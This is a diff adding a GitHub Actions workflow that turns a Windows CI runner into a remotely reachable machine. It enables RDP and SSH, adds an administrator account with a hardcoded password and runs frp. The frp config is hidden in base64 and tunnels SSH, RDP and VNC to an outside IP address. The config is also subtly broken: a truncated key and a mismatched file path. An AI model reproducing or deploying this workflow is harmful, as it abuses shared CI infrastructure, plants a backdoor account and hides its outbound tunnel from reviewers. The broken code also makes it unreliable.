@@ -1,0 +1,65 @@
+name: Win RDP with FRP 
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  enable-rdp-ssh:
+    runs-on: windows-latest
+
+    steps:
+    - name: Enable RDP
+      run: |
+        netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+      shell: powershell
+
+    - name: Enable SSH
+      run: |
+        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+        Start-Service sshd
+        Set-Service -Name sshd -StartupType 'Automatic'
+        New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+      shell: powershell
+
+    - name: Add User 'finan' with Complex Password
+      run: |
+        $password = ConvertTo-SecureString "ComplexPassword123!" -AsPlainText -Force
+        New-LocalUser -Name "finan" -Password $password -FullName "Finan User" -Description "User account for Finan"
+        Add-LocalGroupMember -Group "Users" -Member "finan"
+        Add-LocalGroupMember -Group "Administrators" -Member "finan"
+      shell: powershell
+
+    - name: Download FRPC
+      run: |
+        Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.37.0/frp_0.37.0_windows_amd64.zip" -OutFile frp.zip
+        Expand-Archive -Path frp.zip -DestinationPath frp
+      shell: powershell
+
+    - name: Decrypt Base64 string and create frpc.toml
+      run: |
+        $base64String = "ZXJ2ZXJBZGRyID0gIjE4NS4xNTkuMTI4LjExMSIKc2VydmVyUG9ydCA9IDcwMDAKCltbcHJveGllc11dCm5hbWUgPSAic3NoIgp0eXBlID0gInRjcCIKbG9jYWxJUCA9ICIxMjcuMC4wLjEiCmxvY2FsUG9ydCA9IDIyCnJlbW90ZVBvcnQgPSA2MDIyCgpbW3Byb3hpZXNdXQpuYW1lID0gInJkcCIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSAzMzg5CnJlbW90ZVBvcnQgPSA2Mzg5CgpbW3Byb3hpZXNdXQpuYW1lID0gInZuYyIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSA1OTAxCnJlbW90ZVBvcnQgPSA1OTAxCgpbW3Byb3hpZXNdXQpuYW1lID0gIm5vVm5jIgp0eXBlID0gInRjcCIKbG9jYWxJUCA9ICIxMjcuMC4wLjEiCmxvY2FsUG9ydCA9IDY5MDEKcmVtb3RlUG9ydCA9IDY5MDEKCg=="
+        $decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
+        Set-Content -Path frp/frpc.toml -Value $decodedString
+      shell: powershell
+
+    - name: Run FRPC
+      run: |
+        $frpcPath = Join-Path -Path (Get-Location) -ChildPath "frp/frpc.exe"
+        if (Test-Path $frpcPath) {
+            & $frpcPath -c frpc.toml
+        } else {
+            Write-Error "frpc.exe not found at $frpcPath"
+        }
+      shell: powershell
+
+    - name: Display RDP and SSH Status
+      run: |
+        Get-Service -Name TermService
+        Get-Service -Name sshd
+      shell: powershell
